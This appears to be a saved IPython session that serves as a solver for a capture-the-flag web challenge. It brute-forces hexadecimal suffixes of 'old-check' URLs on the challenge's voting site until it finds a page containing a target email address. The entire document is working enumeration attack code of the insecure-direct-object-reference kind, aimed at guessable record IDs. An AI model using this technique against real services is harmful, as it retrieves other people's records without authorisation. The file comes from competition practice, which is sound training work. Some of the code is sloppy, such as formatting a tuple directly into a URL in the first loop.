# coding: utf-8
url="https://voting.challs.cybersecuritychallenge.ro/old-check/5ca90e{}"
from requests import get
from string import ascii_lowercase,digits
from itertools import product
k="abcdef0123456789"
url="https://voting.challs.cybersecuritychallenge.ro/old-check/5ca90{}"
url="https://voting.challs.cybersecuritychallenge.ro/old-check/5ca90f{}"
url="https://voting.challs.cybersecuritychallenge.ro/old-check/5ca90f9{}"
for i in product(k, repeat=2):
    print (i)
    rsp = get(url.format(i))
    if "lasediyo@digital-work.net" in rsp.text:
        print ("found!!!!")
        break
    
get_ipython().run_line_magic('clear', '')
r=get("https://voting.challs.cybersecuritychallenge.ro/old-check/5ca91041d")
r.text
"lasediyo@digital-work.net" in r.text
url="https://voting.challs.cybersecuritychallenge.ro/old-check/5ca910a{}"
for i in product(k, repeat=2):
    print (url.format(''.join(i)))
    rsp = get(url.format(''.join(i)))
    if "lasediyo@digital-work.net" in rsp.text:
        print ("found!!!!")
        break
    
url="https://voting.challs.cybersecuritychallenge.ro/old-check/5ca91{}"
for i in product(k, repeat=3):
    print (url.format(''.join(i)))
    rsp = get(url.format(''.join(i)))
    if "sqe027adVn@bkmvenjrbhvuerb23.com" in rsp.text:
        print ("found!!!!")
        print (rsp.text)
        break
    
url="https://voting.challs.cybersecuritychallenge.ro/old-check/5ca911{}"
for i in product(k, repeat=3):
    print (url.format(''.join(i)))
    rsp = get(url.format(''.join(i)))
    if "sqe027adVn@bkmvenjrbhvuerb23.com" in rsp.text:
        print ("found!!!!")
        print (rsp.text)
        break
    
    
get_ipython().run_line_magic('save', 'web2.solver 1-10000')
